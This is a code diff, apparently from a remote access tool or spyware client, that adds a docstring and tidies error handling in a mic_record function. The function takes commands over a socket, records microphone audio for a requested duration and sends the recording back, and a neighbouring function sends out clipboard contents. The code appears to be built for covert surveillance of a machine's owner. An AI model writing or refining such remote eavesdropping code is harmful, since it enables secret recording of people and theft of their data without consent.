@@ -1030,17 +1030,41 @@ def send_clipboard(
 
 
 def mic_record(socket, command):
+    """
+    Records audio and sends the audio file through the socket connection.
+    
+    This function processes the recording command, captures audio for the specified duration,
+    saves it as a WAV file, and transmits it over the provided socket connection.
+    Includes error handling for invalid commands and recording failures.
+
+    Args:
+        socket (socket.socket): The network socket object for communication
+        command (str): The command string in format 'mic_record --duration X' 
+                      where X is recording duration in seconds
+
+    Returns:
+        bool: 
+            - True if recording and transmission succeeded
+            - False if any error occurred
+
+    Raises:
+        ValueError: If duration parameter is invalid
+        Exception: For any other unexpected errors during recording
+
+    Example:
+        >>> mic_record(socket, "mic_record --duration 5")
+    """
     try:
         parts = command.split()
         if len(parts) < 3 or parts[0] != "mic_record" or parts[1] != "--duration":
             socket_send(
-                socket, "Error: Invalid command format. Use 'mic_record --duration X'"
+                socket, "[!] Error: Invalid command format. Use 'mic_record --duration X'"
             )
             return False
 
         duration = int(parts[2])
         if duration <= 0:
-            socket_send(socket, "Error: Duration must be positive")
+            socket_send(socket, "[!] Error: Duration must be positive")
             return False
 
         with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmpfile:
@@ -1063,7 +1087,7 @@ def mic_record(socket, command):
             return True
 
         except Exception as e:
-            socket_send(socket, f"Recording Error: {str(e)}")
+            socket_send(socket, f"[!] Recording Error: {str(e)}")
             return False
         finally:
             try:
@@ -1072,6 +1096,8 @@ def mic_record(socket, command):
                 pass
 
     except ValueError:
-        socket_send(socket, "Error: Invalid duration value. Please provide a number")
+        socket_send(socket, "[!] Error: Invalid duration value. Please provide a number")
+        return False
     except Exception as e:
-        socket_send(socket, f"System Error: {str(e)}")
+        socket_send(socket, f"[!] System Error: {str(e)}")
+        return False
